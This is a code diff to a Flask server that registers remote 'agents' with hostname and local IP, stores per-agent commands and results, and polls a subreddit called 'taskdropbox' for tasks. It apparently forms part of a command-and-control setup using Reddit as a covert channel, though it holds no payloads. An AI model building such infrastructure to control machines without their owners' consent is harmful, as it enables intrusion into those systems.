@@ -20,6 +20,7 @@ def register():
     data = request.get_json()
     agent_id = data.get("agent_id")
     hostname = data.get("hostname")
+    local_ip = data.get("local_ip")
 
     if not agent_id:
         return jsonify({"error": "no agent_id provided"}), 400
@@ -30,13 +31,15 @@ def register():
         agent = Agent(
             agent_id=agent_id,
             hostname=hostname,
+            local_ip=local_ip,
             last_seen=datetime.utcnow(),
             status="Alive"
         )
         db.session.add(agent)
     else:
         # Update existing agent info
-        agent.hostname = hostname  # in case hostname changed
+        agent.hostname = hostname
+        agent.local_ip = local_ip 
         agent.last_seen = datetime.utcnow()
         agent.status = "Alive"
 
@@ -130,7 +133,7 @@ def mark_processed():
 
     return jsonify({"status": "ok", "post_id": post_id})
 
-@app.route("/agents", methods=["GET"])
+@app.route("/agents", methods=["GET"])  
 def list_agents():
     agents = Agent.query.all()
     data = []
@@ -138,10 +141,35 @@ def list_agents():
         data.append({
             "agent_id": a.agent_id,
             "hostname": a.hostname,
+            "local_ip": a.local_ip,
             "last_seen": a.last_seen.isoformat() if a.last_seen else None,
             "status": a.status
         })
     return jsonify(data)
+
+@app.route("/agents/<id>", methods=["GET"])
+def get_agents_with_commands(id):
+    agent = Agent.query.get(id)
+    if not agent:
+        return jsonify({"error": "agent not found"}), 404
+
+    cmd_list = [{
+        "Command Id": c.id,
+        "Command": c.command,
+        "Status": c.status,
+        "Result": c.result
+
+    } for c in agent.commands]  
+
+    return jsonify({
+        "Agent Id": agent.agent_id,
+        "Commands": cmd_list,
+        "Hostname": agent.hostname,
+        "Local IP": agent.local_ip,
+        "Status": agent.status,
+        "Last Seen": agent.last_seen
+    })
+    
 
 def poll_reddit():
     with open("config.json") as f:
@@ -155,7 +183,7 @@ def poll_reddit():
         user_agent=creds["user_agent"]
     )
 
-    SERVER_URL = "http://127.0.0.1:5000"  # Flask local
+    SERVER_URL = "http://192.168.1.69:5555"  # Flask local
     SUBREDDIT = "taskdropbox"
 
     while True:
@@ -207,4 +235,4 @@ if __name__ == "__main__":
     Thread(target=poll_reddit, daemon=True).start()
     Thread(target=monitor_agents, daemon=True).start()
 
-    app.run(host="0.0.0.0", port=5000, debug=True)
+    app.run(host="192.168.1.69", port=5555, debug=True)
